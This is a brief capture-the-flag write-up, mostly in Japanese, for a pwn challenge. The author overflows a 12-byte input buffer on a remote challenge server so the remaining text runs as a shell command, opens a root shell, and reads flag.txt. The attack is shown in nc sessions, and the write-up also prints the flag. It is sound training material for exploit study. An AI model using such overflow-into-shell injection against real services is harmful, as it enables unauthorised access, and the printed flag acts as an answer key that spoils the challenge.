# Starting place:PWN:324pts
I like storing passwords in files.  
ASLR is off on the server.  

[starting_place.out](starting_place.out)  
[213.133.103.186:6591](213.133.103.186:6591)  

# Solution
実行ファイルと接続先が渡される。  
ひとまず接続してみる。  
```bash
$ nc 213.133.103.186 6591
Hi! would you like see the current directory?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Ok

sh: 1: AAAAAAAAAAAAAAAA: not found
```
BOFでも起こそうかと適当に入力したところ、shのエラーが出た。  
一定以上の文字を入力するとなぜかシェルにわたるようだ。  
```bash
$ nc 213.133.103.186 6591
Hi! would you like see the current directory?
ABCDEFGHIJKLMNOPQRSTUVWXYZ
ABCDEFGHIJKLMNOPQRSTUVWXYZ
Ok

sh: 1: MNOPQRSTUVWXYZ: not found
sh: 2: �: not found
$ nc 213.133.103.186 6591
Hi! would you like see the current directory?
ABCDEFGHIJKLsh
ABCDEFGHIJKLsh
Ok

sh: 0: can't access tty; job control turned off
# ls
ls
Dockerfile  boot  flag.txt  lib32   media  problem_backend.c  run   sys  var
a.out       dev   home      lib64   mnt    proc               sbin  tmp
bin         etc   lib       libx32  opt    root               srv   usr
# cat flag.txt
cat flag.txt
bucket{congrats-on-the-buffer-overlfow-success}#
```
無事にシェルが起動でき、flag.txtをみるとflagが書かれていた。  

## bucket{congrats-on-the-buffer-overlfow-success}